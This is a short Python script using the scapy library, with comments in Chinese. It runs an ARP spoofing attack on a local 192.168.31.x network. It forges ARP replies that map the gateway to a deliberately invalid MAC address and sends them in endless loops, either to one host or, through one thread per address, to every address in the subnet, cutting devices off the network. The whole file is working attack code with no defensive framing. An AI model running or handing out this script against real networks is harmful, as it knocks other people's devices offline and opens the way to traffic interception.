from scapy.all import *
import threading

def arpAttack(target_ip):

	# 定义目标IP地址和目标MAC地址
	#target_ip = "192.168.31.233"
	src_mac = "d4:35:38:7a:cf:00"  # MAC地址篡改值，设置为无效值
	target_getway = "192.168.31.1" # 网关地址

	# 构造ARP响应数据包
	arp_response = ARP(op = 2, pdst = target_ip, psrc = target_getway, hwsrc = src_mac)

	# 无限循环发送ARP响应数据包
	while True:
		send(arp_response)
		print(target_ip)
		#time.sleep(0.2)
	return

def arpAllAttack():
	n = 256
	threads = []
	for i in range(n + 1):
		ip = "192.168.31." + str(i)
		thread = threading.Thread(target = arpAttack, args = (ip,))
		threads.append(thread)
		thread.daemon = True # 开启守护线程，主进程死则线程终止
		thread.start()
	input() # 键盘输入即终止
	return

#arpAttack("192.168.31.233")
arpAllAttack()